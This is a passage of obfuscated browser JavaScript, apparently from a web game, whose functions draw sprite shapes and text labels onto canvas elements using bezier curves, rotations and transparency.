			Δ.bezierCurveTo(ᐃ * 30.5, ᐃ * 48, ᐃ * 30.5, 48 * ᐃ, ᐃ * 45, ᐃ * 52);
			Δ.bezierCurveTo(ᐃ * 36.5, 63 * ᐃ, ᐃ * 36.5, 63 * ᐃ, ᐃ * 28, ᐃ * 74);
			Δ.bezierCurveTo(32 * ᐃ, 86 * ᐃ, ᐃ * 61, 92 * ᐃ, ᐃ * 78, ᐃ * 76);
			Δ.bezierCurveTo(93 * ᐃ, 62 * ᐃ, ᐃ * 92, 40 * ᐃ, 80 * ᐃ, ᐃ * 26);
			Δ.bezierCurveTo(65 * ᐃ, 11 * ᐃ, 42 * ᐃ, ᐃᐃᐃᐃⲆᐃᐃ * ᐃ, 34 * ᐃ, ᐃ * 21);
			Δ.bezierCurveTo(22 * ᐃ, ᐃ * 27, ᐃ * 16, ᐃ * 39, ⵠᐃᐃⵠΔⵠΔ * ᐃ, ᐃ * 44);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⵠⲆ]);
			Δ.globalAlpha = 1;
			Δ.translate(ΔᐃΔΔ, ᐃ * -15);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(16 * ᐃ, ᐃ * 44);
			Δ.bezierCurveTo(30.5 * ᐃ, ᐃ * 48, ᐃ * 30.5, 48 * ᐃ, 45 * ᐃ, ᐃ * 52);
			Δ.bezierCurveTo(36.5 * ᐃ, 63 * ᐃ, 36.5 * ᐃ, ᐃ * 63, ᐃ * 28, ᐃ * 74);
			Δ.bezierCurveTo(32 * ᐃ, 86 * ᐃ, ᐃ * 61, 92 * ᐃ, 78 * ᐃ, ᐃ * 76);
			Δ.bezierCurveTo(93 * ᐃ, ᐃ * 62, ᐃ * 92, 40 * ᐃ, 80 * ᐃ, ᐃ * 26);
			Δ.bezierCurveTo(ᐃ * 65, 11 * ᐃ, 42 * ᐃ, ᐃ * 16, 34 * ᐃ, 21 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 22, 27 * ᐃ, ⵠᐃᐃⵠΔⵠΔ * ᐃ, 39 * ᐃ, ᐃ * 16, 44 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ], Ⲇᐃ[2], 8 * ᐃ);
			return Ⲇⵠ
		}

		function ΔⵠᐃⲆⲆᐃⲆ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 131 * ᐃ;
			Ⲇⵠ.height = 121 * ᐃ;
			Δ.translate(0, ᐃ * Δⵠᐃᐃᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 110, 59 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93, 61.5 * ᐃ, 93 * ᐃ, ᐃ * 61.5, 76 * ᐃ, ᐃ * 64);
			Δ.bezierCurveTo(ᐃ * 84.5, 78.5 * ᐃ, ᐃ * 84.5, 78.5 * ᐃ, ᐃ * 93, 93 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 70, ᐃ * 111, ᐃ * 43, 103 * ᐃ, ᐃ * 30, 82 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⵠⲆᐃⵠⵠΔⵠ, ᐃ * 61, ᐃ * 25, ᐃ * 30, ᐃ * 51, ᐃ * 21);
			Δ.bezierCurveTo(66 * ᐃ, ⵠⵠⵠⵠΔ * ᐃ, ᐃ * 83, ᐃ * 18, 96 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(104 * ᐃ, 35 * ᐃ, ᐃ * 109, 47 * ᐃ, ᐃ * 110, 58 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ⵠΔⲆ;
			Δ.translate(0, ᐃ * -ᐃᐃⵠⵠⲆ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * 110, 59 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 93, 61.5 * ᐃ, 93 * ᐃ, ᐃ * 61.5, ᐃ * 76, 64 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 84.5, 78.5 * ᐃ, ᐃ * 84.5, 78.5 * ᐃ, 93 * ᐃ, 93 * ᐃ);
			Δ.bezierCurveTo(70 * ᐃ, 111 * ᐃ, ᐃ * 43, ᐃ * 103, ᐃ * 30, 82 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ⵠᐃᐃΔᐃ, 61 * ᐃ, ᐃ * 25, 30 * ᐃ, ᐃ * 51, 21 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 66, ᐃ * ΔⲆᐃᐃⲆ, 83 * ᐃ, ᐃ * 18, 96 * ᐃ, ᐃ * 29);
			Δ.bezierCurveTo(ᐃ * 104, ᐃ * 35, ᐃ * 109, ᐃ * 47, ᐃ * 110, 58 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠΔ], Ⲇᐃ[Δⵠⵠⵠ], 10 * ᐃ);
			return Ⲇⵠ
		}
		const ⵠΔᐃⲆᐃΔⵠ = ⵠᐃⲆⵠⲆⵠᐃ;

		function ΔᐃⲆΔⲆⵠⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 220 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 230;
			var ⲆⲆⵠ = ⲆⵠᐃΔⲆ * ᐃ;
			var ΔⵠΔΔ = ⲆⲆⵠ / 4;
			var ᐃⵠΔⲆ = ᐃ * ΔΔⲆⵠᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(ᐃⵠⵠ / ⵠⲆⵠⲆ, ⵠⵠᐃ / ⲆᐃᐃⲆ + ᐃⵠΔⲆ);
			Δ.globalAlpha = .5;
			ⵠΔⵠᐃ(Δ, 7, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = 1;
			Δ.translate(ᐃⵠⲆ, -ᐃⵠΔⲆ);
			ⵠΔⵠᐃ(Δ, ⲆⲆⵠⲆⵠ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			ⵠΔⵠᐃ(Δ, ⵠΔᐃΔⲆ, .65 * ⲆⲆⵠ, ΔⵠΔΔ * .65);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⵠΔΔ]);
			return Ⲇⵠ
		}

		function ᐃᐃΔΔᐃ(ᐃ, text, ⵠⵠᐃ, Ⲇᐃ, ᐃⵠΔⲆ, ᐃⵠⵠᐃ, ⵠⲆᐃΔⵠΔΔ, ᐃᐃⲆⲆⲆ, ᐃᐃᐃᐃ, ⵠΔⲆⲆ, ⲆᐃⵠⲆⲆ) {
			ⲆᐃⵠⲆⲆ === ⲆΔⵠⲆⲆ && (ⲆᐃⵠⲆⲆ = 0);
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			ᐃⵠⵠᐃ = !ᐃⵠⵠᐃ ? ᐃⵠⲆ : ᐃⵠⵠᐃ * ᐃ;
			var ΔΔⲆ = Math.floor(ᐃ * ⵠⵠᐃ);
			Δ.font = ΔΔⲆ + ⵠ[484];
			Δ.lineJoin = ⵠ[5];
			ᐃᐃⲆⲆⲆ = ᐃᐃⲆⲆⲆ * ᐃ;
			var ΔⲆᐃΔⲆ = ⵠⲆᐃΔⵠΔΔ ? ᐃᐃⲆⲆⲆ * 2 : ᐃⵠΔ;
			if (ᐃᐃᐃᐃ) var ⵠⲆⵠ = Math.min(Δ.measureText(text).width + ᐃ * ᐃⵠⲆⲆⲆ + ΔⲆᐃΔⲆ, ᐃᐃᐃᐃ);
			else var ⵠⲆⵠ = Δ.measureText(text).width + ᐃ * ⵠⵠⵠΔ + ΔⲆᐃΔⲆ + ⲆᐃⵠⲆⲆ * ᐃ * ᐃⵠⲆⲆⲆ;
			var ΔΔⲆ = (ΔΔⲆ + ᐃⵠⵠᐃ + ⲆᐃⵠⲆⲆ) * ᐃ + ΔⲆᐃΔⲆ;
			Ⲇⵠ.width = ⵠⲆⵠ;
			Ⲇⵠ.height = ΔΔⲆ;
			ⵠⲆᐃΔⵠΔΔ && (Δ.fillStyle = ⵠⲆᐃΔⵠΔΔ, Ⲇᐃᐃ(Δ, ᐃⵠΔ, ⵠΔⲆⵠ, ⵠⲆⵠ, ΔΔⲆ, ᐃᐃⲆⲆⲆ * ⵠΔⲆᐃ), Δ.fill(), Δ.translate(ᐃᐃⲆⲆⲆ, ᐃᐃⲆⲆⲆ));
			Δ.textBaseline = ⵠ[ᐃⲆΔⵠ], Δ.font = ⵠⵠᐃ + ⵠ[484];
			Δ.lineJoin = ⵠ[ΔΔᐃⲆ];
			if (ᐃⵠΔⲆ) {
				Δ.beginPath();
				Δ.fillStyle = ᐃⵠΔⲆ;
				Δ.fillText(text, 0, ΔΔⲆ / 2 + ᐃⵠⵠᐃ - ΔⲆᐃΔⲆ / ⲆⲆΔᐃ, ⵠⲆⵠ)
			}
			Δ.beginPath();
			ⵠΔⲆⲆ && (Δ.strokeStyle = ⵠΔⲆⲆ, Δ.lineWidth = ⲆᐃⵠⲆⲆ, Δ.strokeText(text, ⲆᐃⵠⲆⲆ, (ΔΔⲆ - ΔⲆᐃΔⲆ) / 2, ⵠⲆⵠ));
			Δ.fillStyle = Ⲇᐃ;
			Δ.fillText(text, ⲆᐃⵠⲆⲆ, (ΔΔⲆ - ΔⲆᐃΔⲆ) / ᐃⲆΔⲆ, ⵠⲆⵠ);
			return Ⲇⵠ
		}
		const ⵠⲆΔⵠΔ = ᐃᐃⵠⲆᐃ;

		function ᐃΔⲆⵠⵠ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 140 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 150;
			var ᐃⵠΔⲆ = ᐃ * 10;
			var ⵠⲆⵠ = ᐃ * ⲆⵠᐃⲆ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(-50 * ᐃ, ᐃ * -38 + ᐃⵠΔⲆ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : ΔΔΔ;
			Δ.beginPath();
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 65, ᐃ * 160, ᐃ * 85, 152 * ᐃ, 95 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152, ᐃ * 95, ᐃ * 173, 94 * ᐃ, 187 * ᐃ, 102 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 187, 102 * ᐃ, ᐃ * 180, 120 * ᐃ, ᐃ * 155, 126 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, 126 * ᐃ, ᐃ * 166, 138 * ᐃ, 169 * ᐃ, ᐃ * 148);
			Δ.bezierCurveTo(ᐃ * 169, ᐃ * 148, 148 * ᐃ, ᐃ * 152, 133 * ᐃ, ᐃ * 140);
			Δ.bezierCurveTo(133 * ᐃ, 140 * ᐃ, 134 * ᐃ, 160 * ᐃ, 122 * ᐃ, ᐃ * 175);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 175, 107 * ᐃ, ᐃ * 162, ᐃ * 107, 144 * ᐃ);
			Δ.bezierCurveTo(107 * ᐃ, ᐃ * 144, 98 * ᐃ, 164 * ᐃ, ᐃ * 73, ᐃ * 167);
			Δ.bezierCurveTo(73 * ᐃ, 167 * ᐃ, ᐃ * 72, ᐃ * 134, ᐃ * 90, 127 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 90, ᐃ * 127, 70 * ᐃ, 134 * ᐃ, ᐃ * 55, 123 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 55, 123 * ᐃ, ᐃ * 58, ᐃ * 115, ᐃ * 75, ᐃ * 104);
			Δ.bezierCurveTo(ᐃ * 75, ᐃ * 104, 66 * ᐃ, ᐃ * 96, ᐃ * 61, 77 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 61, ᐃ * 77, ᐃ * 83, 74 * ᐃ, 102 * ᐃ, ᐃ * 89);
			Δ.bezierCurveTo(ᐃ * 102, 89 * ᐃ, 92 * ᐃ, ᐃ * 66, ᐃ * 110, ᐃ * 41);
			Δ.bezierCurveTo(111 * ᐃ, 40 * ᐃ, 130 * ᐃ, 54 * ᐃ, ᐃ * 130, ᐃ * 82);
			Δ.bezierCurveTo(ᐃ * 130, ᐃ * 82, ᐃ * 143, ᐃ * 67, 159 * ᐃ, 65 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆᐃⵠ]);
			Δ.translate(Δᐃᐃᐃ, ⵠΔⲆⵠ - ᐃⵠΔⲆ);
			Δ.globalAlpha = ΔΔΔ;
			Δ.beginPath();
			Δ.bezierCurveTo(160 * ᐃ, ᐃ * 65, ᐃ * 160, 85 * ᐃ, ᐃ * 152, ᐃ * 95);
			Δ.bezierCurveTo(ᐃ * 152, 95 * ᐃ, 173 * ᐃ, ᐃ * 94, ᐃ * 187, ᐃ * 102);
			Δ.bezierCurveTo(ᐃ * 187, 102 * ᐃ, 180 * ᐃ, ᐃ * 120, 155 * ᐃ, ᐃ * 126);
			Δ.bezierCurveTo(154 * ᐃ, 126 * ᐃ, 166 * ᐃ, 138 * ᐃ, ᐃ * 169, 148 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 169, ᐃ * 148, 148 * ᐃ, ᐃ * 152, 133 * ᐃ, 140 * ᐃ);
			Δ.bezierCurveTo(133 * ᐃ, 140 * ᐃ, 134 * ᐃ, 160 * ᐃ, ᐃ * 122, 175 * ᐃ);
			Δ.bezierCurveTo(122 * ᐃ, ᐃ * 175, ᐃ * 107, 162 * ᐃ, ᐃ * 107, 144 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 107, ᐃ * 144, 98 * ᐃ, 164 * ᐃ, 73 * ᐃ, ᐃ * 167);
			Δ.bezierCurveTo(73 * ᐃ, 167 * ᐃ, 72 * ᐃ, ᐃ * 134, 90 * ᐃ, ᐃ * 127);
			Δ.bezierCurveTo(ᐃ * 90, 127 * ᐃ, 70 * ᐃ, 134 * ᐃ, ᐃ * 55, 123 * ᐃ);
			Δ.bezierCurveTo(55 * ᐃ, ᐃ * 123, ᐃ * 58, ᐃ * 115, ᐃ * 75, ᐃ * 104);
			Δ.bezierCurveTo(ᐃ * 75, 104 * ᐃ, 66 * ᐃ, ᐃ * 96, ᐃ * 61, ᐃ * 77);
			Δ.bezierCurveTo(ᐃ * 61, ᐃ * 77, 83 * ᐃ, 74 * ᐃ, 102 * ᐃ, 89 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 102, 89 * ᐃ, 92 * ᐃ, 66 * ᐃ, ᐃ * 110, 41 * ᐃ);
			Δ.bezierCurveTo(111 * ᐃ, 40 * ᐃ, 130 * ᐃ, 54 * ᐃ, ᐃ * 130, 82 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 130, ᐃ * 82, ᐃ * 143, 67 * ᐃ, 159 * ᐃ, ᐃ * 65);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[ΔⵠᐃⲆ], ⵠⲆⵠ);
			return Ⲇⵠ
		}

		function ΔⵠⲆΔΔ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = 220 * ᐃ;
			var ⵠⵠᐃ = ᐃ * 220;
			var ⲆⲆⵠ = ᐃ * 100;
			var ΔⵠΔΔ = ⲆⲆⵠ / 4;
			var ᐃⵠΔⲆ = 20 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.translate(ᐃⵠⵠ / 2, ⵠⵠᐃ / ⵠⵠΔⲆ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			!ᐃΔⲆΔ && Δ.translate(0 * ᐃ, -ᐃⵠⲆᐃᐃ * ᐃ);
			ⵠΔⵠᐃ(Δ, 7, ⲆⲆⵠ, ΔⵠΔΔ);
			ᐃΔⲆΔ ? ΔⲆ(Δ, Ⲇᐃ[0]) : ΔⲆ(Δ, Ⲇᐃ[ᐃΔᐃⲆ]);
			Δ.globalAlpha = 1;
			if (0 == ⵠᐃ) {
				ⵠΔⵠᐃ(Δ, Δⵠᐃᐃⵠ, ⲆⲆⵠ * .65, ΔⵠΔΔ * .65);
				ΔⲆ(Δ, Ⲇᐃ[2])
			} else if (ⵠᐃ == 1) {
				Δ.translate(ᐃ * 20, 20 * ᐃ);
				ⵠΔⵠᐃ(Δ, Δⵠᐃᐃⵠ, .45 * ⲆⲆⵠ, .4 * ΔⵠΔΔ);
				ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⲆⲆ])
			}
			return Ⲇⵠ
		}

		function ᐃⲆΔᐃⲆ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 120;
			var ⵠⵠᐃ = ᐃ * 150;
			var ⲆⲆⵠ = 60 * ᐃ;
			var ΔⵠΔΔ = ⲆⲆⵠ / ΔⲆⲆⲆ;
			var ᐃⵠΔⲆ = ᐃ * 15;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 + 0 * ᐃ, ⵠⵠᐃ / ΔⲆΔΔΔ + ⲆⲆⲆᐃ * ᐃ + ᐃⵠΔⲆ);
			Δ.rotate(Math.PI / ⵠⵠⵠⵠ);
			Δ.globalAlpha = .5;
			ⵠΔⵠᐃ(Δ, 8, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 - ᐃ * 11, ⵠⵠᐃ / 2 + ᐃⲆⵠᐃⵠ * ᐃ);
			Δ.globalAlpha = 1;
			Δ.rotate(Math.PI / ΔⲆᐃⲆ);
			Δ.translate(ⵠΔⲆⵠ, -ᐃⵠΔⲆ);
			ⵠΔⵠᐃ(Δ, ᐃⵠⵠⵠⲆ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ΔΔΔ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / Δᐃⵠⵠ - 9 * ᐃ, ⵠⵠᐃ / 2 - 12 * ᐃ);
			Δ.rotate(Math.PI / 2.8);
			ⵠΔⵠᐃ(Δ, ⵠⵠᐃⵠ, ⲆⲆⵠ * .5, ΔⵠΔΔ * .4);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆⲆⲆ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / Δᐃⵠⵠ + ᐃ * ⲆⲆⵠᐃⲆΔⲆ, ⵠⵠᐃ / ᐃⲆΔⲆ + ᐃ * ⵠⵠᐃⵠ);
			Δ.rotate(Math.PI / Ⲇᐃⵠ);
			ⵠΔⵠᐃ(Δ, 5, .5 * ⲆⲆⵠ, ΔⵠΔΔ * .4);
			ΔⲆ(Δ, Ⲇᐃ[2]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 - ⲆⲆᐃⵠΔ * ᐃ, ⵠⵠᐃ / 2 + 20 * ᐃ);
			Δ.rotate(Math.PI / 2.25);
			ⵠΔⵠᐃ(Δ, ᐃᐃⲆᐃ, ⲆⲆⵠ * .5, .4 * ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⵠᐃⲆ]);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⲆⲆⵠⲆᐃ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ⲆⵠⲆᐃΔ * ᐃ;
			var ⵠⵠᐃ = ᐃ * 18;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			var Δⵠ = ᐃ * ⵠⲆⲆΔᐃ;
			var ⲆⵠⲆ = ᐃ * 9;
			var ⲆⲆⵠ = ᐃ * ⵠᐃΔΔᐃⲆⵠ;
			Δ.save();
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.globalAlpha = ΔⲆⵠ;
			ⵠᐃᐃ(Δ, ΔΔⵠⵠ, ⲆⲆⲆᐃ, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			var ⲆⲆⵠ = ᐃ * ΔΔⵠΔ;
			var Δⵠ = ⵠⲆⲆ;
			var ⲆⵠⲆ = -3 * ᐃ;
			Δ.translate(Δⵠ, ⲆⵠⲆ);
			Δ.globalAlpha = ᐃᐃⲆΔ;
			ⵠᐃᐃ(Δ, ΔᐃΔΔ, 0, ⲆⲆⵠ);
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃ]);
			Δ.restore();
			return Ⲇⵠ
		}

		function ⵠⲆⲆⲆⵠΔᐃ(ᐃ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = ᐃ * 80;
			Ⲇⵠ.height = ᐃ * 100;
			Δ.scale(.5, .5);
			Δ.translate(ⲆΔΔᐃᐃ, ΔⲆΔⲆⲆ);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(47 * ᐃ, ᐃ * 5);
			Δ.bezierCurveTo(ᐃ * 19, ᐃ * 30, ᐃⲆⲆΔΔⲆᐃ * ᐃ, ᐃ * 42, ᐃ * ⲆⲆⲆΔᐃ, ᐃ * 55);
			Δ.bezierCurveTo(11 * ᐃ, ᐃ * 75, 27 * ᐃ, ᐃ * 76, 36 * ᐃ, 72 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 52, ᐃ * 60, ᐃ * 53, 46 * ᐃ, 54 * ᐃ, 31 * ᐃ);
			Δ.bezierCurveTo(53 * ᐃ, ᐃ * ⲆⵠⵠᐃⲆⲆΔ, 50 * ᐃ, ᐃ * 9, 48 * ᐃ, ᐃ * 6);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ]);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[ⵠⲆⵠⵠ];
			Δ.moveTo(ᐃ * ᐃⵠΔᐃᐃⵠⵠ, ᐃ * 70);
			Δ.bezierCurveTo(ᐃ * 18, 77 * ᐃ, ᐃ * 10, 83 * ᐃ, ΔⲆᐃⵠᐃ * ᐃ, ᐃ * 87);
			ΔⲆ(Δ, undefined, Ⲇᐃ[0], ᐃ * 10);
			Δ.translate(0, -ᐃΔᐃΔⲆ);
			Δ.globalAlpha = 1;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠⵠ];
			Δ.moveTo(47 * ᐃ, 5 * ᐃ);
			Δ.bezierCurveTo(ᐃⲆΔⲆᐃⲆᐃ * ᐃ, 30 * ᐃ, ᐃ * ᐃᐃⵠᐃΔᐃⵠ, 42 * ᐃ, ᐃ * 10, 55 * ᐃ);
			Δ.bezierCurveTo(ᐃ * ΔⵠᐃΔⵠ, ᐃ * 75, ᐃ * 27, 76 * ᐃ, ᐃ * 36, ᐃ * 72);
			Δ.bezierCurveTo(ᐃ * 52, ᐃ * 60, ᐃ * 53, 46 * ᐃ, ᐃ * 54, ᐃ * 31);
			Δ.bezierCurveTo(53 * ᐃ, 14 * ᐃ, ᐃ * 50, 9 * ᐃ, 48 * ᐃ, ⲆᐃⲆᐃ * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[2], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⵠᐃⲆΔ];
			Δ.moveTo(ᐃ * ᐃᐃⲆⵠΔΔᐃ, 70 * ᐃ);
			Δ.bezierCurveTo(ᐃᐃᐃᐃⲆ * ᐃ, ᐃ * 77, ᐃ * ⲆΔΔᐃᐃ, 83 * ᐃ, ⲆΔⵠᐃ * ᐃ, 87 * ᐃ);
			ΔⲆ(Δ, undefined, Ⲇᐃ[2], ᐃ * ⲆᐃΔⲆⵠ);
			Δ.globalAlpha = .5;
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(ᐃ * 17, ᐃ * 70);
			Δ.bezierCurveTo(33 * ᐃ, 52 * ᐃ, ᐃ * 39, 33 * ᐃ, ᐃ * 48, ᐃ * ⲆⵠⲆᐃⵠⲆΔ);
			ΔⲆ(Δ, ᐃᐃⵠᐃᐃ, Ⲇᐃ[ΔⵠⵠΔ], ᐃ * 8);
			return Ⲇⵠ
		}

		function ⵠⲆⵠᐃⵠ(ᐃ, ⵠΔᐃΔΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			var ᐃⵠⵠ = ᐃ * 180;
			var ⵠⵠᐃ = 210 * ᐃ;
			var ⲆⲆⵠ = 60 * ᐃ;
			var ΔⵠΔΔ = ⲆⲆⵠ / 4;
			var ᐃⵠΔⲆ = 20 * ᐃ;
			Ⲇⵠ.width = ᐃⵠⵠ;
			Ⲇⵠ.height = ⵠⵠᐃ;
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 - ⲆΔⵠ * ᐃ, ⵠⵠᐃ / 2 - ᐃ * 35 + ᐃⵠΔⲆ);
			Δ.rotate(Math.PI / -1.8);
			Δ.globalAlpha = .5;
			Δ.translate(ᐃ * Δᐃᐃᐃ, ᐃ * -20);
			ⵠΔⵠᐃ(Δ, ᐃΔΔⲆ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ΔⲆⲆ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 + ᐃ * 10, ⵠⵠᐃ / ΔⵠᐃⲆ + 15 * ᐃ + ᐃⵠΔⲆ);
			Δ.rotate(Math.PI / ⲆⲆΔᐃ);
			Δ.globalAlpha = .5;
			Δ.translate(ΔΔⵠ * ᐃ, -ⵠΔⵠⵠᐃ * ᐃ);
			ⵠΔⵠᐃ(Δ, ⵠᐃⲆΔ, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⲆᐃ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 - ᐃ * 50, ⵠⵠᐃ / ᐃⲆΔⲆ + ᐃ * 40 + ᐃⵠΔⲆ);
			Δ.rotate(Math.PI / 3);
			Δ.globalAlpha = .5;
			Δ.translate(0, -ⵠΔΔⲆⲆ * ᐃ);
			ⵠΔⵠᐃ(Δ, 5, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / Δᐃⵠⵠ - ᐃ * ᐃΔΔ, ⵠⵠᐃ / ⲆᐃᐃⲆ - 35 * ᐃ);
			Δ.rotate(Math.PI / -1.8);
			Δ.globalAlpha = 1;
			Δ.translate(Δᐃᐃᐃ * ᐃ, -20 * ᐃ);
			ⵠΔⵠᐃ(Δ, 5, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔ]);
			Δ.restore();
			Δ.save();
			Δ.translate(ᐃⵠⵠ / 2 + 10 * ᐃ, ⵠⵠᐃ / Ⲇⵠⵠᐃ + ᐃ * Δᐃᐃᐃᐃⵠⵠ);
			Δ.rotate(Math.PI / ⲆΔΔⵠ);
			Δ.globalAlpha = 1;
			Δ.translate(Δⵠᐃ, ᐃ * -20);
			ⵠΔⵠᐃ(Δ, 5, ⲆⲆⵠ, ΔⵠΔΔ);
			ΔⲆ(Δ, Ⲇᐃ[1]);
			Δ.restore();
			Δ.save();
